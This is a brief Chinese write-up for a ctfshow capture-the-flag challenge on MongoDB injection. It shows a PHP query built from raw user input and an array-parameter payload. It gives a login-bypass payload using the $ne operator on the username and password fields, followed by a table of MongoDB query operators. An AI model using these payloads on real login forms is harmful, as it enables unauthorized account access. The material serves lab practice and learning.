使用工具nosqlattack。不能用sqlmap。

```
/api/?id[]=flag
```
语句
```
$query = new MongoDB\Driver\Query($data);
$cursor = $manager->executeQuery('ctfshow.ctfshow_user', $query)->toArray();

直接登录
username[$ne]=1&password[$ne]=1
$ne是不相等的意思
```

^
| 方法名  | 描述                                                   |
| ---- | ---------------------------------------------------- |
| $gt  | 大于                                                   |
| $lte | 小于等于                                                 |
| $in  | 包含                                                   |
| $nin | 不包含                                                  |
| $lt  | 小于                                                   |
| $gte | 大于等于                                                 |
| $ne  | 不等于                                                  |
| $eq  | 等于                                                   |
| $and | 与                                                    |
| $nor | $nor在NOR一个或多个查询表达式的数组上执行逻辑运算，并选择 对该数组中所有查询表达式都失败的文档。 |
| $not | 反匹配(1.3.3及以上版本)，字段值不匹配表达式或者字段值不存在。                   |
| $or  | 或                                                    |

